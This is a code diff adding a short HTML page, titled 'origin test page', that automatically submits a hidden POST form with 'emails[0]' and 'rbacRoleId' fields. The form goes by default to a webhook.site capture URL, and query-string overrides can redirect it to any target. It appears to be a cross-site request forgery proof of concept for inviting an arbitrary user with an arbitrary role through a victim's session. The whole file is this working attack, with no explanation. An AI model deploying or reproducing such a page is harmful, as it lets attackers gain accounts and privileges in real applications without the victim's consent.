@@ -1,0 +1,16 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>origin test page</title></head>
+<body>
+<form id="f" method="POST" action="https://webhook.site/28bddd9e-9056-4264-8fed-92abdedaa0d9">
+<input type="hidden" name="emails[0]" value="">
+<input type="hidden" name="rbacRoleId" value="">
+</form>
+<script>
+// Optional overrides via query string: ?action=<url>&email=<v>&role=<v>
+var q = new URLSearchParams(location.search), f = document.getElementById('f');
+if (q.get('action')) f.action = q.get('action');
+if (q.get('email') !== null) f.elements['emails[0]'].value = q.get('email');
+if (q.get('role') !== null) f.elements['rbacRoleId'].value = q.get('role');
+f.submit();
+</script>
+</body></html>
